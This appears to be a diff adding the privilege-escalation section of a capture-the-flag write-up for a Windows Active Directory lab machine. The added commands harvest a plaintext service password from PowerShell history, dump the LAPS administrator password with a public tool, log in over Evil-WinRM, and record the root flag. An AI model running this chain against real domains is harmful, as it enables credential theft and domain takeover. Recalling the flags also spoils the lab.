@@ -7288,9 +7288,64 @@ No saved Wifi credentials found
        \---------------------------------------------------------------------------/
 ````
 
+````
+ÉÍÍÍÍÍÍÍÍÍÍ¹ LAPS Settings
+È If installed, local administrator password is changed frequently and is restricted by ACL 
+    LAPS Enabled: 1
+    LAPS Admin Account Name: 
+    LAPS Password Complexity: 4
+    LAPS Password Length: 24
+    LAPS Expiration Protection Enabled: 1
+    
+    ÉÍÍÍÍÍÍÍÍÍÍ¹ PowerShell Settings
+    PowerShell v2 Version: 2.0
+    PowerShell v5 Version: 5.1.17763.1
+    PowerShell Core Version: 
+    Transcription Settings: 
+    Module Logging Settings: 
+    Scriptblock Logging Settings: 
+    PS history file: C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+    PS history size: 434B
+````
+
+````
+*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+Enter PEM pass phrase:
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+````
+
+https://github.com/n00py/LAPSDumper
+````
+python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -l timelapse.htb -d timelapse.htb
+DC01$:3.%b59!!,5T8v!fI5o6c9Gya
+````
+
+````
+# evil-winrm -i 10.10.11.152 -S -u Administrator -p '3.%b59!!,5T8v!fI5o6c9Gya' -S
+
+Evil-WinRM shell v3.3
+
+Warning: SSL enabled
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
+07c6b22c29907283832c4a85d1323976
+````
 
 ## Root
 
 ## Secrets
 
 * FLAG_USER = 8acd93fced1257b5205467e86f96d6ff
+* FLAG_ROOT = 07c6b22c29907283832c4a85d1323976
